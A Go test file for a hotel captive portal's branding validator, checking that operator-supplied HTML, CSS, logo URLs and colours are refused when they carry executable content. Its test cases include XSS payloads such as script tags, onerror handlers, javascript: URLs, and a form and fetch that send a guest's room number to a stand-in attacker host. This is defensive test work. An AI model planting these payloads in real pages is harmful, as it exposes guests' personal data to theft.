package main

// THE PORTAL BRANDING ESCAPE HATCH, HELD TO THE ONE RULE THAT MATTERS.
//
// Operators can supply custom CSS and HTML so a hotel can look like itself. The page they are customising is
// a CAPTIVE PORTAL: it collects room numbers, surnames, reservation numbers and voucher codes. Executable
// content injected into it can read every one of those and post them anywhere.
//
// So the validator REFUSES rather than sanitises, and these tests are the specification of what it refuses.
// They are deliberately adversarial: each case is a way a real attempt would be spelled, not a single
// canonical "<script>" that any naive check would catch.

import "testing"

func TestBrandingRefusesExecutableContent(t *testing.T) {
	for _, tc := range []struct{ name, field, value string }{
		{"a plain script tag", "custom_html", `<script>fetch('//x/'+document.forms[0].room.value)</script>`},
		{"a script tag with whitespace", "custom_html", "< script >alert(1)</ script >"},
		{"mixed case", "custom_html", `<ScRiPt>alert(1)</ScRiPt>`},
		{"an inline handler", "custom_html", `<div onclick="steal()">Welcome</div>`},
		{"an onerror handler on an image", "custom_html", `<img src=x onerror="fetch('//x')">`},
		{"a javascript: URL", "custom_html", `<a href="javascript:steal()">Help</a>`},
		{"an iframe", "custom_html", `<iframe src="//evil.example"></iframe>`},
		{"an object", "custom_html", `<object data="//evil.example"></object>`},
		// A SECOND FORM THAT COLLECTS CREDENTIALS is the subtlest of these: it looks like markup, contains no
		// script at all, and posts the guest's room number wherever it likes.
		{"a second form", "custom_html", `<form action="//evil.example"><input name="room"></form>`},
		{"css @import", "custom_css", `@import url("//evil.example/x.css");`},
		{"css expression", "custom_css", `body { width: expression(alert(1)); }`},
		{"css behaviour", "custom_css", `body { behavior: url(#default#time2); }`},
	} {
		t.Run(tc.name, func(t *testing.T) {
			err := validateDesign(map[string]any{tc.field: tc.value})
			if err == nil {
				t.Fatalf("%s was ACCEPTED into a page that collects guest credentials", tc.name)
			}
			// The refusal must say why, because an operator who cannot tell what was rejected will try again
			// with the same thing spelled differently.
			if len(err.Error()) < 20 {
				t.Errorf("the refusal does not explain itself: %q", err)
			}
		})
	}
}

func TestBrandingAcceptsOrdinaryCustomisation(t *testing.T) {
	// The hatch has to be usable, or operators will ask for something worse. Real styling and real markup
	// must pass.
	ok := map[string]any{
		"hotel_name":       "Coral Sea Holiday Resort",
		"brand_color":      "#0f6b63",
		"brand_color_dark": "#0b544e",
		"text_color":       "rgb(28, 43, 42)",
		"corner_radius":    "18px",
		"logo_url":         "/assets/logo.png",
		"background_url":   "https://cdn.example.com/resort.jpg",
		"font_family":      "Inter, system-ui, sans-serif",
		"custom_css":       ".card { box-shadow: 0 10px 40px rgba(0,0,0,.2); } .tab { letter-spacing: .02em; }",
		"custom_html":      `<p class="small">Ask reception for help on extension <strong>9</strong>.</p>`,
	}
	if err := validateDesign(ok); err != nil {
		t.Fatalf("an ordinary hotel design was refused: %v", err)
	}
}

func TestBrandingRefusesAssetsFromAnywhere(t *testing.T) {
	// A logo is fetched by the guest's browser. Allowing plain http would let anyone on the path replace the
	// hotel's logo, and allowing an arbitrary scheme is how javascript: gets back in through a URL field.
	for _, bad := range []string{
		"http://evil.example/logo.png",
		"javascript:alert(1)",
		"//evil.example/logo.png",
		"ftp://example/logo.png",
	} {
		if err := validateDesign(map[string]any{"logo_url": bad}); err == nil {
			t.Errorf("logo_url %q was accepted", bad)
		}
	}
	for _, good := range []string{"/assets/logo.png", "https://cdn.example.com/l.png", "data:image/png;base64,AAAA"} {
		if err := validateDesign(map[string]any{"logo_url": good}); err != nil {
			t.Errorf("logo_url %q was refused: %v", good, err)
		}
	}
}

func TestBrandingRefusesAColourThatIsNotAColour(t *testing.T) {
	// brand_color is interpolated into a style property. "anything the browser accepts" includes url().
	for _, bad := range []string{"url(javascript:alert(1))", "red; background: url(//x)", "#ggg", "expression(1)"} {
		if err := validateDesign(map[string]any{"brand_color": bad}); err == nil {
			t.Errorf("brand_color %q was accepted", bad)
		}
	}
	for _, good := range []string{"#fff", "#0f6b63", "#0f6b63ff", "rgb(15, 107, 99)"} {
		if err := validateDesign(map[string]any{"brand_color": good}); err != nil {
			t.Errorf("brand_color %q was refused: %v", good, err)
		}
	}
}

func TestBrandingBoundsTheTemplateSize(t *testing.T) {
	// The document is read on every portal load. An operator pasting a megabyte of CSS should be told so.
	big := make([]byte, 70*1024)
	for i := range big {
		big[i] = 'a'
	}
	if err := validateDesign(map[string]any{"custom_css": string(big)}); err == nil {
		t.Fatal("a 70 KB stylesheet was accepted")
	}
}
